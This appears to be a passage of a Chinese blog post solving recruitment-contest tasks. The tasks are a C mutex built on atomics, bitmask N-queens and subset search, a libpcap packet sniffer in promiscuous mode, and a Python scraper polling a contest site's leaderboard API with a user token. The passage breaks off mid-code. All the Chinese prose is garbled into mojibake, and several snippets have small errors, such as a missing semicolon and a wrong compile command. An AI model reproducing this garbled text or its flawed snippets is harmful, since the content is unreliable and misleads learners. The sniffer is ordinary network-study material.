CH2äº†è§£â€äº’æ–¥é”â€è¿™ä¸ªæ¦‚å¿µï¼Œæ€è€ƒï¼š ä¸¤ä¸ªçº¿ç¨‹éƒ½åŒæ—¶è®¿é—®äº†åŒä¸€ä¸ªå˜é‡ï¼šäº’æ–¥é” å¯¹äºäº’æ–¥é”çš„è®¿é—®éš¾é“ä¸ä¼šäº§ç”Ÿæ•°æ®ç«äº‰å—ï¼Ÿ å›ç­”: ä¸ºä»€ä¹ˆè®¿é—®äº’æ–¥é”ä¸ä¼šäº§ç”Ÿæ•°æ®ç«äº‰ï¼Ÿ è¯·å°è¯•è‡ªå·±ç¼–å†™ä¸€ä¸ªäº’æ–¥é”(é¢å¤–åŠ åˆ†) ã€æ“ä½œç³»ç»Ÿã€‘é”çš„å®ç° å½“ä¸€ä¸ªçº¿ç¨‹è·å–äº’æ–¥é”æ—¶ï¼Œå…¶ä»–çº¿ç¨‹å°è¯•è·å–å¿…é¡»ç­‰å¾…ï¼Œç›´åˆ°å½“å‰çº¿ç¨‹é‡Šæ”¾é”ã€‚äº’æ–¥é”çš„å®ç°ç”±åº•å±‚ç¡¬ä»¶æˆ–æ“ä½œç³»ç»Ÿæ”¯æŒï¼Œé€šå¸¸é€šè¿‡æŸç§åŸå­æ“ä½œï¼Œå½“ä¸€ä¸ªçº¿ç¨‹è®¿é—®å…¶ä»–çº¿ç¨‹æŒæœ‰çš„é”æ—¶ï¼Œä¼šè¢« OS è°ƒåº¦ä¸ºé˜»å¡çŠ¶æ€ï¼ˆä¼‘çœ ï¼‰ï¼Œç›´åˆ°é”è¢«é‡Šæ”¾åï¼Œå†å”¤é†’ä¸€ä¸ªä¼‘çœ çš„çº¿ç¨‹ã€‚ ï¼ˆå¦å¤–ï¼Œè‡ªæ—‹é”æ˜¯ä¸€ç§å¿™ç­‰å¾…é”ã€‚å®ƒåœ¨é”è¢«å…¶ä»–çº¿ç¨‹æŒæœ‰æ—¶ä¸ä¼šé˜»å¡å½“å‰çº¿ç¨‹ï¼Œè€Œæ˜¯ä¸æ–­åœ°å°è¯•è·å–é”ï¼Œç›´åˆ°é”å¯ç”¨ä¸ºæ­¢ã€‚è¿™ç§å¿™ç­‰å¾…çš„è¡Œä¸ºç§°ä¸ºâ€œè‡ªæ—‹â€ã€‚ï¼‰ ä½¿ç”¨äº†åŸå­æ“ä½œæ¥å®ç°äº’æ–¥é”çš„åŠ é”å’Œè§£é”é€»è¾‘ã€‚ 1234567891011121314151617typedef struct { atomic_int lock_flag;} my_mutex_t;void my_mutex_init(my_mutex_t *mutex) { atomic_store(&amp;mutex-&gt;lock_flag, 0);}void my_mutex_lock(my_mutex_t *mutex) { while (atomic_exchange(&amp;mutex-&gt;lock_flag, 1) == 1) { sched_yield() //æŒ‚èµ·ï¼Œè€Œéå¿™ç­‰å¾… } }void my_mutex_unlock(my_mutex_t *mutex) { atomic_store(&amp;mutex-&gt;lock_flag, 0);} å®Œæ•´ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556#include &lt;pthread.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;stdatomic.h&gt;#include &lt;sched.h&gt;typedef struct { atomic_int lock_flag;} my_mutex_t;void my_mutex_init(my_mutex_t *mutex) { atomic_store(&amp;mutex-&gt;lock_flag, 0);}void my_mutex_lock(my_mutex_t *mutex) { while (atomic_exchange(&amp;mutex-&gt;lock_flag, 1) == 1) { sched_yield(); }}void my_mutex_unlock(my_mutex_t *mutex) { atomic_store(&amp;mutex-&gt;lock_flag, 0);}int work_load;my_mutex_t my_mutex;void *worker(void *counter_ptr) { for (int i = 0; i &lt; work_load; i++) { my_mutex_lock(&amp;my_mutex); (*(int *)counter_ptr) += 1; my_mutex_unlock(&amp;my_mutex); } return NULL;}int main() { printf(&quot;give the workload per thread: &quot;); scanf(&quot;%d&quot;, &amp;work_load); pthread_t thread1, thread2; int counter = 0; my_mutex_init(&amp;my_mutex); pthread_create(&amp;thread1, NULL, worker, &amp;counter); pthread_create(&amp;thread2, NULL, worker, &amp;counter); pthread_join(thread1, NULL); pthread_join(thread2, NULL); printf(&quot;Totally count: %d\\n&quot;, counter); return 0;} ğŸ“ŸBitterCH112345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#define BOARD_SIZE 8int upper_lim = 1;int count = 0;/** int row: store the valid bit after applying the vertical rule* int ld: store the valid bit after applying the left diagram rule* int rd: store the valid bit after applying the right diagram rule* bit '0' represent where we can place a chess*/void solve_problem(int row ,int ld, int rd) { if( row == upper_lim) { count += 1; return ; } /* 'current' represent all the valid bit*/ int current = upper_lim &amp; (~ (row | ld | rd)); int buffer = current; while(buffer) { int valid = buffer &amp; (-buffer); buffer -= valid; solve_problem(row|valid, (ld|valid)&lt;&lt;1, (rd|valid)&gt;&gt;1); /////////////////////////////////////// }}/* board_size shouldn't be too large */void find_n_th_queen(int board_size ) { upper_lim = (1 &lt;&lt; board_size) - 1; solve_problem(0, 0, 0);}int main() { find_n_th_queen(BOARD_SIZE); printf(&quot;Answer: %d&quot;, count);}// Answer: 92 CH2ç”¨ä½æ¥æ ‡è®°æ•°ç»„å…ƒç´ çš„çŠ¶æ€ã€‚ 1234567891011121314151617181920212223242526def solve(nums): n = len(nums) states = 1 &lt;&lt; n max_sum = 0 for state in range(states): valid = True curr_sum = 0 for i in range(n): if state &amp; (1 &lt;&lt; i): #choose ith element curr_sum += nums[i] if i &gt; 0 and (state &amp; (1 &lt;&lt; (i - 1))): #conflict valid = False break if valid: max_sum = max(max_sum, curr_sum) return max_sumnums = [1, 15, 3, 7, 12, 10, 19, 8, 5, 17, 2, 6, 11, 9, 4, 14, 13, 18, 16, 20]print(solve(nums))'''130[Done] exited with code=0 in 0.965 seconds''' åŠ¨æ€è§„åˆ’å¯ä»¥æ˜¾è‘—é™ä½æ—¶é—´ã€‚ åŠ å¯†ç®—æ³•ï¼šAESä¸­å­˜åœ¨è¡Œç§»ä½ï¼Œå“ˆå¸Œç®—æ³•ä¼šä½¿ç”¨ä½ç§»ã€å¼‚æˆ–æ“ä½œï¼Œæä¾›å®‰å…¨æ€§ å¿«é€Ÿè¿ç®—ï¼šä½ç§»æ“ä½œå¿«é€Ÿè®¡ç®—ï¼Œå¥‡å¶åˆ¤æ–­ï¼ŒèŠ‚çº¦æ—¶é—´ï¼Œbitsetç­›ç´ æ•°å¯èŠ‚çœç©ºé—´ æ–‡ä»¶æƒé™ï¼šä½¿ç”¨ä½è¿ç®—å¯ä»¥æ–¹ä¾¿åœ°å¼€å¯æˆ–å…³é—­æŸäº›æ ‡å¿—ä½ å¹¶è¡Œè®¡ç®—ï¼šä½è¿ç®—å¯ä»¥å¿«é€Ÿåœ°å¯ç”¨æˆ–ç¦ç”¨æŸä¸ªçº¿ç¨‹æˆ–è€…æ£€æŸ¥æŸä¸ªçº¿ç¨‹çš„çŠ¶æ€ ğŸ©é¡ºæ‰‹ç‰µç¾Šè¦æ±‚ï¼šä½¿ç”¨Cè¯­è¨€å®ç°ä¸€ä¸ªè‡ªå·±çš„æŠ“åŒ…è½¯ä»¶ ä½¿ç”¨libpcapåº“å®ç°æŠ“åŒ…ã€‚ ç¨‹åºåº”è¯¥å®ç°ï¼šåˆ¤æ–­å¹¶è¾“å‡ºæ¯ä¸ªåŒ…çš„ç±»å‹ï¼ŒåŒ…çš„é•¿åº¦ï¼Œä»¥åŠåŒ…çš„æºåœ°å€å’Œç›®çš„åœ°å€ã€‚ å¦‚æœä½ èƒ½å®ç°å¯¹äºTCPåŒ…çš„æ•è·ï¼Œå¯ä»¥è·å¾—70%çš„åˆ†æ•°ã€‚å¦‚æœä½ èƒ½å®ç°è‡³å°‘ä¸‰ç§åŒ…çš„åˆ†ææ•è·ï¼Œå¯ä»¥è·å¾—å‰©ä¸‹30%çš„åˆ†æ•°ã€‚ ç®€å•é˜è¿°ä¸‹ä½ å¯¹æŠ“åŒ…çš„å®ç°åŸç†çš„ç†è§£ï¼Œæœ€é«˜å¯å¾—é¢å¤–çš„20%åˆ†æ•°ã€‚ hintï¼šè¦ä¸ä¸‹è½½ä¸€ä¸ªwiresharkä½“éªŒä¸‹æŠ“åŒ…ï¼Ÿ é¢˜è§£ï¼š åœ¨Cè¯­è¨€ä¸­ä½¿ç”¨libpcapåº“æ¥è¿›è¡ŒæŠ“åŒ…æ“ä½œã€‚ å®‰è£…libpcapåº“ï¼› 1sudo apt install libpcap-dev å®ç°å¯¹TCPåŒ…çš„æ•è·ï¼› 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;pcap.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;arpa/inet.h&gt; //æä¾›äº†IPåœ°å€çš„è½¬æ¢å‡½æ•°#include &lt;netinet/ip.h&gt;#include &lt;netinet/tcp.h&gt; //å®šä¹‰äº†IPå’ŒTCPå¤´éƒ¨çš„ç»“æ„ä½“// å›è°ƒå‡½æ•°åœ¨æ¯æ¬¡æ•è·åˆ°æ•°æ®åŒ…æ—¶è¢«è°ƒç”¨void packet_handler(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u_char *packet) { struct ip *ip_header = (struct ip *)(packet + 14); //è·³è¿‡ä»¥å¤ªç½‘å¸§å¤´(14)ã€è·å–ipå¤´ struct tcphdr *tcp_header = (struct tcphdr *)(packet + 14 + ip_header-&gt;ip_hl * 4); //è·å–TCPå¤´ printf(&quot;&lt;--------- New Packet Arrived! ---------&gt;\\n&quot;); printf(&quot;Total packet available: %d bytes\\n&quot;, pkthdr-&gt;len); printf(&quot;Expected packet size: %d bytes\\n&quot;, pkthdr-&gt;len); printf(&quot;IP header length (IHL) in bytes: %d\\n&quot;, ip_header-&gt;ip_hl * 4); printf(&quot;Source Address: %s\\n&quot;, inet_ntoa(ip_header-&gt;ip_src)); printf(&quot;Destination Address: %s\\n&quot;, inet_ntoa(ip_header-&gt;ip_dst)); printf(&quot;TCP header length in bytes: %d\\n&quot;, tcp_header-&gt;th_off * 4); printf(&quot;Size of all headers combined: %d bytes\\n&quot;, ip_header-&gt;ip_hl * 4 + tcp_header-&gt;th_off * 4); printf(&quot;Payload size: %d bytes\\n&quot;, pkthdr-&gt;len - (ip_header-&gt;ip_hl * 4 + tcp_header-&gt;th_off * 4)); printf(&quot;---------------------------------------\\n&quot;);} //ä¸‰ä¸ªå‚æ•°åˆ†åˆ«è¡¨ç¤ºï¼šç”¨æˆ·ä¼ é€’çš„æ•°æ®ã€æ•°æ®åŒ…å¤´éƒ¨ä¿¡æ¯ã€æŒ‡å‘å®é™…çš„æ•°æ®åŒ…å†…å®¹int main() { char errbuf[PCAP_ERRBUF_SIZE]; pcap_if_t *alldevs; pcap_if_t *device; pcap_t *handle; // è°ƒç”¨å‡½æ•°è·å–æ‰€æœ‰å¯ç”¨è®¾å¤‡åˆ—è¡¨ if (pcap_findalldevs(&amp;alldevs, errbuf) == -1) { fprintf(stderr, &quot;Error finding devices: %s\\n&quot;, errbuf); return 1; } // é€‰æ‹©ç¬¬ä¸€ä¸ªè®¾å¤‡ device = alldevs; printf(&quot;Using device: %s\\n&quot;, device-&gt;name); // æ‰“å¼€è®¾å¤‡ handle = pcap_open_live(device-&gt;name, BUFSIZ, 1, 1000, errbuf); pcap_loop(handle, 0, packet_handler, NULL); //æ•è·æ•°æ®åŒ…ï¼Œå›è°ƒ pcap_freealldevs(alldevs); pcap_close(handle); return 0;} ç¼–è¯‘è¿è¡Œä¸Šè¿°ä»£ç ï¼Œæ‰“å¼€firefoxï¼Œæ•è·åˆ°æ•°æ®åŒ…ï¼š 1234567891011121314$ gcc -o packet_sniffer packet_sniffer -lpcap$ sudo ./packet_snifferUsing device: loopback0&lt;--------- New Packet Arrived! ---------&gt;Total packet available: 1514 bytesExpected packet size: 1514 bytesIP header length (IHL) in bytes: 20Source Address: 127.0.0.1Destination Address: 127.0.0.1TCP header length in bytes: 32Size of all headers combined: 52 bytesPayload size: 1462 bytes---------------------------------------...... è¿™äº›æ•°æ®åŒ…æ˜¯åœ¨ WSL 2 å†…éƒ¨é€šè¿‡ loopback æ¥å£è¿›è¡Œçš„æœ¬åœ°é€šä¿¡ï¼Œæºå¤´å’Œç›®çš„åœ°éƒ½æ˜¯127.0.0.1ã€‚æŸ¥æ‰¾ç½‘ç»œæ¥å£ï¼š 12345678910$ ip addr...4: loopback0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:15:5d:78:40:b2 brd ff:ff:ff:ff:ff:ff5: eth2: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether e0:2e:0b:08:09:53 brd ff:ff:ff:ff:ff:ff inet 192.168.0.144/24 brd 192.168.0.255 scope global noprefixroute eth2 valid_lft forever preferred_lft forever inet6 fe80::66a7:f661:86e5:c634/64 scope link nodad noprefixroute valid_lft forever preferred_lft forever å‘ç°eth2æ˜¯å½“å‰å”¯ä¸€çŠ¶æ€ä¸º UP ä¸”é…ç½®äº† IP åœ°å€çš„æ¥å£ï¼Œæ˜¯WSLä¸»è¦ç”¨äºä¸å¤–éƒ¨ç½‘ç»œé€šä¿¡çš„æ¥å£ã€‚ä¿®æ”¹ä»£ç ï¼š 1234567891011121314151617int main() { ... // æŸ¥æ‰¾åä¸º &quot;eth2&quot; çš„è®¾å¤‡ for (device = alldevs; device != NULL; device = device-&gt;next) { if (strcmp(device-&gt;name, &quot;eth2&quot;) == 0) { found = 1; break; } } if (!found) { printf(&quot;Device eth2 not found. Make sure you have the necessary permissions.\\n&quot;); pcap_freealldevs(alldevs); return 1; } ...} ç¼–è¯‘è¿è¡Œç»“æœå¦‚ä¸‹ï¼š 1234567891011&lt;--------- New Packet Arrived! ---------&gt;Total packet available: 66 bytesExpected packet size: 66 bytesIP header length (IHL) in bytes: 20Source Address: 192.168.0.144Destination Address: 34.107.243.93TCP header length in bytes: 32Size of all headers combined: 52 bytesPayload size: 14 bytes---------------------------------------... å®ç°å¯¹TCPã€UDPå’ŒICMPä¸‰ç§åŒ…çš„æ•è·ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105#include &lt;pcap.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;arpa/inet.h&gt;#include &lt;netinet/ip.h&gt;#include &lt;netinet/tcp.h&gt;#include &lt;netinet/udp.h&gt;#include &lt;netinet/ip_icmp.h&gt;// å›è°ƒå‡½æ•°ï¼Œç”¨äºå¤„ç†æ•è·çš„æ•°æ®åŒ…void packet_handler(u_char *user_data, const struct pcap_pkthdr *pkthdr, const u_char *packet) { struct ip *ip_header = (struct ip *)(packet + 14); // è·³è¿‡ä»¥å¤ªç½‘å¤´éƒ¨ï¼ˆEthernet headerï¼‰ int ip_header_length = ip_header-&gt;ip_hl * 4; printf(&quot;&lt;--------- New Packet Arrived! ---------&gt;\\n&quot;); printf(&quot;Total packet available: %d bytes\\n&quot;, pkthdr-&gt;len); printf(&quot;Expected packet size: %d bytes\\n&quot;, pkthdr-&gt;len); printf(&quot;IP header length (IHL) in bytes: %d\\n&quot;, ip_header_length); printf(&quot;Source Address: %s\\n&quot;, inet_ntoa(ip_header-&gt;ip_src)); printf(&quot;Destination Address: %s\\n&quot;, inet_ntoa(ip_header-&gt;ip_dst)); // æ£€æŸ¥IPåŒ…çš„åè®®å­—æ®µä»¥ç¡®å®šå…¶ç±»å‹ switch (ip_header-&gt;ip_p) { case IPPROTO_TCP: { struct tcphdr *tcp_header = (struct tcphdr *)(packet + 14 + ip_header_length); int tcp_header_length = tcp_header-&gt;th_off * 4; printf(&quot;Protocol: TCP\\n&quot;); printf(&quot;TCP header length in bytes: %d\\n&quot;, tcp_header_length); printf(&quot;Size of all headers combined: %d bytes\\n&quot;, ip_header_length + tcp_header_length); printf(&quot;Payload size: %d bytes\\n&quot;, pkthdr-&gt;len - (ip_header_length + tcp_header_length)); break; } case IPPROTO_UDP: { struct udphdr *udp_header = (struct udphdr *)(packet + 14 + ip_header_length); int udp_header_length = 8; // UDP header å›ºå®šé•¿åº¦ä¸º 8 å­—èŠ‚ printf(&quot;Protocol: UDP\\n&quot;); printf(&quot;UDP header length in bytes: %d\\n&quot;, udp_header_length); printf(&quot;Size of all headers combined: %d bytes\\n&quot;, ip_header_length + udp_header_length); printf(&quot;Payload size: %d bytes\\n&quot;, ntohs(udp_header-&gt;len) - udp_header_length); break; } case IPPROTO_ICMP: { struct icmphdr *icmp_header = (struct icmphdr *)(packet + 14 + ip_header_length); int icmp_header_length = 8; // ICMP header é€šå¸¸ä¸º 8 å­—èŠ‚ printf(&quot;Protocol: ICMP\\n&quot;); printf(&quot;ICMP header length in bytes: %d\\n&quot;, icmp_header_length); printf(&quot;Size of all headers combined: %d bytes\\n&quot;, ip_header_length + icmp_header_length); printf(&quot;Payload size: %d bytes\\n&quot;, pkthdr-&gt;len - (ip_header_length + icmp_header_length)); break; } default: printf(&quot;Protocol: Other\\n&quot;); break; } printf(&quot;---------------------------------------\\n&quot;);}int main() { char errbuf[PCAP_ERRBUF_SIZE]; pcap_if_t *alldevs; pcap_if_t *device; pcap_t *handle; int found = 0; // ä½¿ç”¨ pcap_findalldevs æ¥è·å–æ‰€æœ‰å¯ç”¨è®¾å¤‡ if (pcap_findalldevs(&amp;alldevs, errbuf) == -1) { fprintf(stderr, &quot;Error finding devices: %s\\n&quot;, errbuf); return 1; } // æŸ¥æ‰¾åä¸º &quot;eth2&quot; çš„è®¾å¤‡ for (device = alldevs; device != NULL; device = device-&gt;next) { if (strcmp(device-&gt;name, &quot;eth2&quot;) == 0) { found = 1; break; } } if (!found) { printf(&quot;Device eth2 not found. Make sure you have the necessary permissions.\\n&quot;); pcap_freealldevs(alldevs); return 1; } printf(&quot;Using device: %s\\n&quot;, device-&gt;name); // æ‰“å¼€è®¾å¤‡ handle = pcap_open_live(device-&gt;name, BUFSIZ, 1, 1000, errbuf); if (handle == NULL) { printf(&quot;Could not open device %s: %s\\n&quot;, device-&gt;name, errbuf); pcap_freealldevs(alldevs); return 1; } // å¼€å§‹æ•è·æ•°æ®åŒ… pcap_loop(handle, 0, packet_handler, NULL); // é‡Šæ”¾è®¾å¤‡åˆ—è¡¨ pcap_freealldevs(alldevs); pcap_close(handle); return 0;} è¿è¡Œä»£ç æŠ“åŒ…ï¼š 123456789101112&lt;--------- New Packet Arrived! ---------&gt;Total packet available: 90 bytesExpected packet size: 90 bytesIP header length (IHL) in bytes: 20Source Address: 185.125.190.57Destination Address: 192.168.0.144Protocol: UDPUDP header length in bytes: 8Size of all headers combined: 28 bytesPayload size: 48 bytes---------------------------------------... é¦–å…ˆæ‰¾åˆ°å¯ç”¨çš„ç½‘ç»œæ¥å£ï¼Œç¡®ä¿æŠ“åŒ…å·¥å…·ç›‘å¬åˆ°æŒ‡å®šç½‘ç»œæ¥å£ä¸Šçš„æ‰€æœ‰æ•°æ®åŒ…ï¼›æ‰“å¼€ç½‘ç»œæ¥å£ï¼Œç½®äºæ··æ‚æ¨¡å¼ï¼ˆ1ï¼‰ï¼Œä»¥ä¾¿æ•è·æ‰€æœ‰ç»è¿‡è¯¥æ¥å£çš„æ•°æ®åŒ…ï¼›å¾ªç¯æ•è·åŒ…ï¼Œè°ƒç”¨å›è°ƒå‡½æ•°ï¼Œè§£æIPåŒ…å¤´çš„å­—æ®µï¼Œåˆ¤æ–­åŒ…æ‰€ä½¿ç”¨çš„ä¼ è¾“å±‚åè®®ç­‰ç­‰ã€‚ libpcapé€šè¿‡æ“ä½œç³»ç»Ÿçš„ç½‘ç»œé©±åŠ¨ä»é“¾è·¯å±‚æ•è·æ•°æ®åŒ…ï¼Œå°†å…¶æš‚å­˜åœ¨å†…æ ¸ç¼“å†²åŒºä¸­ï¼Œç„¶åå°†æ•°æ®åŒ…ä¼ é€’åˆ°ç”¨æˆ·ç©ºé—´ä¾›åº”ç”¨ç¨‹åºåˆ†æã€‚ å‚è€ƒå†…å®¹ï¼š Cè¯­è¨€å¦‚ä½•åšæŠ“åŒ… ğŸ‘¿businçš„é‡å¿ƒè¦æ±‚ï¼šè¯·ä½ å†™ä¸ªç¨‹åºï¼Œè‡ªåŠ¨æ£€æµ‹æ’è¡Œæ¦œçš„å˜åŒ–ã€‚å…·ä½“æœ‰å¦‚ä¸‹ä¸¤ä¸ªéœ€æ±‚ï¼š æ‹›æ–°ç½‘ç«™çš„æ’è¡Œæ¦œåŒ…å«10ä¸ªæ‹›æ–°ç›¸å…³æ–¹å‘ä»¥åŠä¸€ä¸ªæ€»åˆ†æ–¹å‘ã€‚å¦‚æœè¿™11ä¸ªç±»åˆ«ä¸­çš„ä»»æ„ä¸€ä¸ªæ’è¡Œçš„å‰ååå‘ç”Ÿäº†å˜åŒ–ï¼Œç¨‹åºå°±ä¼šæ‰“å°ï¼š1.æ–°çš„å‰ååæ’è¡Œ 2.å“ªä¸€ä¸ªäººæ‰å‡ºäº†å‰åå 3.å“ªä¸€ä¸ªäººè¿›å…¥äº†å‰ååã€‚ ç¨‹åºåº”è¯¥ç›‘æµ‹ç‰¹å®šçš„é¢˜ç›®ï¼ˆä½¿ç”¨åŠ¨æ€å®¹å™¨çš„é¢˜ç›®å¯ä»¥ä¸è¢«ç›‘æµ‹ï¼‰ã€‚å½“æœ‰äººé€šè¿‡äº†è¿™ä¸ªé¢˜ç›®åï¼Œç¨‹åºä¼šæŒ‰ç…§f&quot;passer: {user_name}, task: {task_name}, time: {passing_time}&quot;æ‰“å°å‡ºè¿™æ¡ä¿¡æ¯ã€‚ å°†ç¨‹åºéƒ¨ç½²åœ¨æœåŠ¡å™¨ä¸Šå®ç°24hè¿è¡Œï¼Œå¹¶èƒ½é€šè¿‡ç¤¾äº¤è½¯ä»¶/é‚®ç®±/å…¶ä»–èƒ½ä»ç§»åŠ¨è®¾å¤‡ä¸Šæ¥æ”¶åˆ°æ›´æ–°ä¿¡æ¯çš„æ–¹å¼ï¼Œå°†ä¿¡æ¯å‘é€åˆ°ä½ çš„ç§»åŠ¨è®¾å¤‡ä¸Šï¼Œå®ç°å¯è§†åŒ–çš„ç®¡ç†ç•Œé¢ã€‚ (ps:è¿™å¯èƒ½éœ€è¦ä¸€ç‚¹SAçš„çŸ¥è¯†ï¼‰ é¢˜è§£ï¼šé¦–å…ˆç¼–å†™ç¨‹åºrank.pyå®ç°æ‰“å°æ’åå˜åŒ–æƒ…å†µã€‚ åœ¨https://recruit.cnss.io/#/rankä¸Šï¼Œåˆ·æ–°é¡µé¢åœ¨æµè§ˆå™¨æ§åˆ¶å°ç½‘ç»œä¸­æ‰¾åˆ°äº†fullrankï¼Œå…¶é€šè¿‡XHRè·å–æ•°æ®ï¼Œè¯´æ˜æ’è¡Œæ¦œçš„æ•°æ®å¯èƒ½æ˜¯é€šè¿‡è¯¥è¯·æ±‚åŠ¨æ€åŠ è½½çš„ã€‚äºæ˜¯æˆ‘ä»¬æ¨¡æ‹Ÿæµè§ˆå™¨çš„è¯·æ±‚ï¼Œ**ç”±äºTokenåœ¨éšç€æ—¶é—´å˜åŒ–ï¼Œäºæ˜¯æ·»åŠ æ‰‹åŠ¨è¾“å…¥Tokençš„éƒ¨åˆ†ï¼š** 12345678910111213141516171819202122232425262728293031323334import requestsimport jsondef fetch(url, token): headers = { &quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br, zstd&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &quot;Connection&quot;: &quot;keep-alive&quot;, &quot;Host&quot;: &quot;recruit.cnss.io:8443&quot;, &quot;Origin&quot;: &quot;https://recruit.cnss.io&quot;, &quot;Referer&quot;: &quot;https://recruit.cnss.io/&quot;, &quot;Sec-CH-UA&quot;: '&quot;Google Chrome&quot;;v=&quot;129&quot;, &quot;Not=A?Brand&quot;;v=&quot;8&quot;, &quot;Chromium&quot;;v=&quot;129&quot;', &quot;Sec-CH-UA-Mobile&quot;: &quot;?0&quot;, &quot;Sec-CH-UA-Platform&quot;: '&quot;Windows&quot;', &quot;Sec-Fetch-Dest&quot;: &quot;empty&quot;, &quot;Sec-Fetch-Mode&quot;: &quot;cors&quot;, &quot;Sec-Fetch-Site&quot;: &quot;same-site&quot;, &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36&quot;, &quot;Token&quot;: token } try: response = requests.get(url, headers=headers) if response.status_code == 200: return response.json() else: print(f&quot;Failed to fetch rankings. HTTP Status Code: {response.status_code}&quot;) print(f&quot;Response content: {response.text}&quot;) return None except requests.exceptions.RequestException as e: print(f&quot;Error fetching rankings: {e}&quot;) return None ä¸»å‡½æ•°æµç¨‹ï¼Œè®°å½•old_rankings.jsonæ–‡ä»¶ï¼Œfetchå¾—åˆ°new_rankingsï¼Œå¯¹æ–°æ—§æ’è¡Œè¿›è¡Œæ¯”è¾ƒï¼Œæ‰“å°ä¿¡æ¯ï¼Œæ›´æ–°old_rankingsã€‚ 12345678910111213141516171819202122232425def main(): url = &quot;https://recruit.cnss.io:8443/v1/fullrank&quot; token = input(&quot;Please enter your access token: &quot;).strip() if not token: print(&quot;Your Token cannot be NULL.&quot;) return try: with open(&quot;old_rankings.json&quot;, &quot;r&quot;) as file: old_rankings = json.load(file) except FileNotFoundError: old_rankings = {} new_rankings = fetch(url, token) if new_rankings: changes = compare(old_rankings, new_rankings) print_changes(changes) with open(&quot;old_rankings.json&quot;, &quot;w&quot;, encoding='utf-8') as file: json.dump(new_rankings, file, ensure_ascii=False, indent=4)if __name__ == &quot;__main__&quot;: main() ä¸‹é¢æ˜¯compareå’Œprintå‡½æ•° 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849def compare(old_rankings, new_rankings): changes = {} for direction, new_top10 in new_rankings.items(): old_top10 = old_rankings.get(direction, []) old_top10_users = [item['Name'] for item in old_top10[:10] if 'Name' in item] new_top10_users = [item['Name'] for item in new_top10[:10] if 'Name' in item] entered = set(new_top10_users) - set(old_top10_users) dropped = set(old_top10_users) - set(new_top10_users) order_changed = old_top10_users != new_top10_users #judge if entered or dropped or order_changed: changes[direction] = { 'new_top10': [{'Name': item['Name'], 'Score': item['Score']} for item in new_top10[:10] if 'Name' in item], 'entered': list(entered), 'dropped': list(dropped), 'order_changed': order_changed } return changesdef print_changes(changes): if not changes: print(&quot;æ’åæœªå‘ç”Ÿå˜åŒ–ã€‚&quot;) return for direction, details in changes.items(): print(f&quot;\\næ–¹å‘: {direction}&quot;) print(&quot;æ–°çš„å‰ååæ’è¡Œ:&quot;) for rank, user in enumerate(details['new_top10'], start=1): print(f&quot; åæ¬¡ {rank}: {user['Name']} (å¾—åˆ†: {user['Score']})&quot;) if details['entered']: print(f&quot;è¿›å…¥å‰ååçš„äºº: {', '.join(details['entered'])}&quot;) else: print(&quot;æ²¡æœ‰æ–°è¿›å…¥å‰ååçš„äººã€‚&quot;) if details['dropped']: print(f&quot;æ‰å‡ºå‰ååçš„äºº: {', '.join(details['dropped'])}&quot;) else: print(&quot;æ²¡æœ‰æ‰å‡ºå‰ååçš„äººã€‚&quot;) if details['order_changed']: print(&quot;å‰ååå†…éƒ¨é¡ºåºå‘ç”Ÿäº†å˜åŒ–ã€‚&quot;) è¿è¡Œä¸€ä¸‹ï¼Œå¾—åˆ°è¾“å‡ºã€‚ æ¥ä¸‹æ¥æˆ‘ä»¬ç¼–å†™task.pyç¨‹åºã€‚ä»¥ä¸€é“é¢˜ä¸ºä¾‹ï¼Œæˆ‘çš„æ€è·¯æ˜¯å…ˆåœ¨é¢˜ç›®tasksé‚£ä¸ªé¡µé¢ï¼Œæ•è·ç‰¹å®šé¢˜ç›®çš„pass_numberï¼Œå½“é€šè¿‡äººæ•°å‘ç”Ÿå˜åŒ–æ—¶ï¼Œéå†ç”¨æˆ·ï¼Œåœ¨passrecordå¯»æ‰¾è¯¥é¢˜çš„é€šè¿‡è€…ï¼Œå¼‚æ­¥åŒ–ä»£ç å®ç°å¦‚ä¸‹ Pythonå¼‚æ­¥ç½‘ç»œç¼–ç¨‹åˆ©å™¨â€”â€”è¯¦è§£aiohttpçš„ä½¿ç”¨æ•™ç¨‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879import aiohttpimport asyncioimport jsonfrom datetime import datetimeTASK_URL = &quot;https://recruit.cnss.io:8443/v1/tasks/534&quot;PASSRECORD_URL_TEMPLATE = &quot;https://recruit.cnss.io:8443/v1/passrecord/{}&quot;TARGET_TASK_TITLE = &quot;ğŸ‘¿businçš„é‡å¿ƒ&quot;USER_ID_RANGE = range(530, 535)SLEEP_INTERVAL = 6previous_pass_number = Noneuser_submissions = {}token = &quot;&quot;async def fetch_pass_number(session): headers = { &quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;, &quot;Accept-Encoding&quot;: &quot;gzip, deflate, br, zstd&quot;, &quot;Accept-Language&quot;: &quot;zh-CN,zh;q=0.9,en;q=0.8&quot;, &quot;Connection&quot;: &quot;keep-alive&quot;, &quot;Host&quot;: &quot;recruit.cnss.io:8443&quot;, &quot;Origin&quot;: &quot;https://recruit.cnss.io&quot;, &quot;Referer&quot;: &quot;https://recruit.cnss.io/&quot;, &quot;Sec-CH-UA&quot;: '&quot;Google Chrome&quot;;v=&quot;129&quot;, 